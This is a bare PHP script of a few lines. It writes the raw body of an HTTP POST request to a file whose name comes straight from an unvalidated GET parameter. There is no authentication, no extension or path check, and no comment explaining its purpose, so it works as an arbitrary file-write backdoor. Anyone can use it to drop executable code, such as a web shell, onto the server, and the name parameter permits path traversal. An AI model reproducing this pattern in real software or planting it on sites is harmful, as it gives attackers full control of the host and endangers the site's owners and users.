<?php
$fp = fopen( "./" . $_GET['name'], 'wb' );
fwrite( $fp, $GLOBALS[ 'HTTP_RAW_POST_DATA' ] );
fclose( $fp );
?>